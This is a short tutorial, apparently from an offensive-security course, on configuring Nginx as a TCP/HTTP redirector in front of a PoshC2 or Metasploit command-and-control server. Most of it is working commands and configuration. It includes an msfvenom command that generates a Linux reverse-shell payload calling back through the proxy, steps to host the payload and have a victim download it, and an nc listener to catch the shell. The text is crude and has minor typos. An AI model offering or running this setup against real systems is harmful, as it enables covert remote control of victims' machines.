# Setting up Nginx with TCP proxy 

1. First off this shit is stupid, nginx only knows how to deal with HTTP traffic and beacon traffic can sometimes be encrypted by default making it hard for Nginx to deal with. There for we are going to have to not only set up our `proxy_reverse` but also configure TCP on the server if we want COMs to work all the way with out the use of ssl certs
2. To start lets install Nginx
    ```bash
    sudo apt install nginx 
    ```
3. Now lets modify our config file which might no exist 
    ```bash 
    sudo vim /etc/nginx/conf.d/lp_proxy.conf
    ```
4. Paste the follwing in `lp_proxy.conf`
    ```nginx
    server {
        listen 80;
        listen [::]:80;

        server_name <serverIP-OR-ServerDNSname>;

        location / {
            proxy_pass http://<parrot-c2-ip>;
        }
    }
    ```
4. Now lets add the TCP rules to allow us to handle the beacons
    ```bash
    sudo vim /etc/nginx/nginx.conf
    ```
5. Paste the following Bellow `http {...}` section
    ```nginx
    stream {
        log_format posh '$remote_addr [$time_local] '
        '$protocol $status $bytes_sent $bytes_received '
        '$session_time "$upstream_addr" '
        '"$upstream_bytes_sent" "$upstream_bytes_received" "$upstream_connect_time"';
    
        server {
            listen 8080;

            proxy_pass <Parrot-IP>:80;

            access_log /var/log/nginx/tcp_access.log posh;
            error_log /var/log/nginx/tcp_error.log;

        }

    }
    ```
6. Now lets reload Nginx with the new config files
    ```bash 
    sudo systemctl restart nginx.service
    ```
7. From here we can now create a msfvenom shell or poshc2 with the correct ports set in the TCP section in the example we have `8080` 
    ```bash
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=<proxy-ip> LPORT=8080 -a x64 -f elf > yup.elf
    ```
    > **NOTE:** Follow the same setup if you are using Poshc2 set your bind port to 80/443, and in `payloadcomshost` set your `http://proxy-ip:<stream-listening-port>`
8. Host your payload however and download on victim 
9. Now if you are running msfvenom start you `nc` listener to catch your beacon.
    ```bash
    sudo nc -lnvp 80
    ```
10. tada you have a beacon shelley, fuck you.

## Important Nginx File Locations 
- `/var/www/html` – Website content as seen by visitors.
- `/etc/nginx` – Location of the main Nginx application files.
- `/etc/nginx/nginx.conf` – The main Nginx configuration file.
- `/etc/nginx/sites-available` – List of all websites configured through Nginx.
- `/etc/nginx/sites-enabled` – List of websites actively being served by Nginx.
- `/var/log/nginx/access.log` – Access logs tracking every request to your server.
- `/var/log/ngins/error.log` – A log of any errors generated in Nginx.

## [Return to course page](README.md)